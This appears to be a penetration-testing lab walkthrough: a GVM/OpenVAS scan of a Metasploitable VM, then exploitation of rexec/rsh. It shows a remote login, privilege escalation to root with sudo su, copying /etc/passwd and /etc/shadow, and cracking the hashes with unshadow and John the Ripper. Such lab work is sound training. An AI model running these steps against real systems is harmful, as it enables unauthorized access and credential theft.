Some people get confused about the relationship between the popular OpenVas tool and GVM. OpenVas is a component of GVM that is launched through the GVM interface.

### Step 1: Start GVM services.

1. Start the GVM scanner using the **sudo gvm-start** command. You can also access the **gvm-start** script using the Applications menu on the Kali desktop, **Kali ->02-Vulnerability Analysis -> gvm start**.

┌──(kali㉿Kali)-[~]

└─$ **sudo gvm-start**

**Note**: You may receive the message “**GVM services are already running**.” If the browser does not automatically open, start your browser manually and navigate to **https://127.0.0.1:9392**. The Greenbone Security Assistant login screen will appear in the browser.

2. In the Greenbone Security Assistant login box, enter **admin** as the username and **kali** as the password.

Username: **admin**

Password: **kali**

### Step 2: Scan a host.

In this step, you will scan the Metasploitable vulnerable host using the GVM scanner. This scan may take some time, so be prepared to wait at least 20 or more minutes for it to complete.

1. The GVM Scanner application GUI should open in the browser. Select **Scans -> Tasks** from the menu bar. At the upper left of the **Tasks** window appear three icons. Select the **Task Wizard** icon that looks like a magic wand. Choose **Advanced Task Wizard** from the dropdown menu.
2. In the Advanced Task Wizard window, enter **Metasploitable** as the scan name. In the Target Host(s) field, enter the IP address of Metasploitable, **172.17.0.2**. Leave the rest of the settings unchanged and click **Create** to create the task and start the scan.
3. The Task window indicates the task is running. At the bottom of the window, the task Metasploitable is listed, and the status bar shows the percent complete. Wait until the status shows Done (100% complete). This could take 30 minutes or more.
4. Click the number **1** under the Reports column in the Metasploitable row, next to the status indicator. The report list opens with an entry for the current day and time and the task named Metasploitable.

Open the report by clicking the date and time link under the Date column. The report window opens. There are eleven tabs that show various results that were found during the scan. Click the **Results** tab. The vulnerabilities found are listed in order of severity.

We find a rexec exploit and try to use it.

##### Exploit

Package seems to be missing so here is a work around:

- curl -O http://http.us.debian.org/debian/pool/main/n/netkit-rsh/rsh-client_0.17-17+b1_amd64.deb
- dpkg -i rsh-client_0.17-17+b1_amd64.deb
- rlogin -l root 192.168.0.123
- apt-cache search rsh-client
- found rsh-redone-client?        # This worked for the cisco course.

1. To access the Metasploitable target to exploit the rexec vulnerability, you will need a remote shell client. Use apt-get to install a remote shell (RSH) client on the Kali Linux VM.

┌──(kali㉿Kali)-[~]

└─$ **sudo apt-get install rsh-client**

2. Attempt to log in to the Metasploitable target with the username **msfadmin** using **RSH**. The syntax for the **rsh** command is **rsh -l** [_username_] [_target IP or hostname_]

┌──(kali㉿Kali)-[~]

└─$ **rsh -l msfadmin 172.17.0.2**

3. The login is successful. The prompt changes to the msfadmin user at the remote computer. Use the **pwd** command to determine the remote directory.

msfadmin@metasploitable:~$ **pwd**

/home/msfadmin

4. Attempt to gain root access to Metasploitable using the **sudo su** command. When prompted for a password enter the **msfadmin** password that you uncovered earlier.

msfadmin@metasploitable:~$ **sudo su**

[sudo] password for msfadmin: **msfadmin**

root@metasploitable:/home/msfadmin#

5. At this point, you have full root access to the target computer and can execute commands, upload or download files, or add users. Type **exit** twice to return to the Kali CLI. A message should appear that says **rlogin: connection closed**.

You can copy the /etc/passwd and /etc/shadow files to get the usernames and hashed passwords.

Unshadow can combine the two files and the resulting file can be used by John the Ripper to find the clear text passwords.

```
unshadow passwd.txt shadow.txt > output.db
```

```
john output.db
```

Using wordlist
```
john output.db --wordlist=/usr/share/wordlist/rockyou.txt
```

You exploited the rexec remote access vulnerability that was discovered by GVM by downloading and installing a client that is compatible with rexec. To establish the session, you needed login credentials, so you used SMB enumeration with Nmap to discover clear text credentials on the target. Finally you connected to the target with the rexec client and used the credentials to initiate a session that gave you remote terminal access as root.

